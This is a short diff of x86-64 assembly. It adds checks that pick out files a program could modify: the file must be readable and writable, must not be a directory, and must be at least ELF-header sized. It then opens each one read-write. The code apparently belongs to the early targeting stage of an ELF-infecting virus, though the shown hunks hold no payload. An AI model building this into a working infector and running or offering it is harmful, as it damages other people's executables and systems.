@@ -121,14 +121,14 @@ _stat_file:
 
 _check_file_flags:
 	lea rax, [r15 + 32 + 24]
-	mov rcx, [rax] ;;; rcx & S_IRUSR === 1   ;;;; rcx & S_IWUSR == 1
+	mov rcx, [rax] ;;; rcx & S_IRUSR === 1   
 	and rcx, S_IRUSR
 	test rcx, rcx
 	jz _continue_dirent
 
-	lea rax, [r15 + 32 + 24]
+	lea rax, [r15 + 32 + 24]  
 	mov rcx, [rax]
-	and rcx, S_IWUSR
+	and rcx, S_IWUSR   ;;;; rcx & S_IWUSR == 1
 	test rcx, rcx
 	jz _continue_dirent
 
@@ -137,12 +137,19 @@ _check_file_flags:
 	mov rdx, S_IFDIR
 	and rcx, S_IFMT
 	cmp rdx, rcx
-	je _continue_dirent ; if failure, exit
+	je _continue_dirent ; checks if its a directory
 
-	cmp dword [r15 + 80], 64
+	cmp dword [r15 + 80], 64 ; checks that the file is at least as big as an ELF header
 	jl _continue_dirent
 
+_open_bin:
+	lea rdi, [r15 + 176 + 19 + r10]
+	mov rsi, 0x0002 ; O_RDWR 
+	mov rdx, 0644o
+	mov rax, SYS_OPEN ;; open ( dirent->d_name, O_RW)
+	syscall
 
+	mov rdi, rax
 	mov rax, SYS_CLOSE
 	syscall
 
